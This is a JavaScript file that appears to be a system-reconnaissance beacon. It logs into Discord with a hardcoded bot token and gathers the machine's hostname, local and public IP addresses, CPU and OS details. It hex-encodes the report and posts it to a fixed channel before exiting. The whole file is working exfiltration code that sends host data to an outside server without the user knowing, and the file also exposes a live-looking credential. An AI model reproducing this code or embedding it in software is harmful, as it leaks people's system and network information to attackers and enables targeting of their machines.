import { Client, GatewayIntentBits } from 'discord.js';
import si from 'systeminformation';
import os from 'os';
import {publicIpv4} from 'public-ip';


const token = 'MTI3MTM0MjU1MTQ3OTA5NTMyNw.GWPBra.Bwa3VT11XIwdh_cyjWHtOg7NCjzhdN1BGfo8TY'; 
const channelId = '1271342230153728014';

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}!`);

    const systemInfo = await collectSystemInfo();

    const messageContent =
        `**System Information:**\n\n` +
        `**Machine Name:** ${systemInfo.machineName}\n` +
        `**Local IPs:** ${systemInfo.localIPs.join(', ')}\n` +
        `**Public IP:** ${systemInfo.publicIP}\n` +
        `**CPU:** ${systemInfo.cpu.manufacturer} ${systemInfo.cpu.brand} (${systemInfo.cpu.cores} cores)\n` +
        `**OS:** ${systemInfo.osInfo.distro} ${systemInfo.osInfo.release} (${systemInfo.osInfo.arch})`;

    const hexMessage = Buffer.from(messageContent).toString('hex');

    const channel = client.channels.cache.get(channelId);
    if (channel) {
        channel.send(hexMessage);
    } else {
        console.error('Channel not found!');
    }

    client.destroy();
});

client.login(token);

async function collectSystemInfo() {
    const systemInfo = {};

    systemInfo.machineName = os.hostname();

    const networkInterfaces = os.networkInterfaces();
    systemInfo.localIPs = [];
    for (const interfaceName in networkInterfaces) {
        networkInterfaces[interfaceName].forEach(iface => {
            if (!iface.internal && iface.family === 'IPv4') {
                systemInfo.localIPs.push(iface.address);
            }
        });
    }

    systemInfo.publicIP = await publicIpv4();

    systemInfo.cpu = await si.cpu();
    systemInfo.memory = await si.mem();
    systemInfo.osInfo = await si.osInfo();

    return systemInfo;
}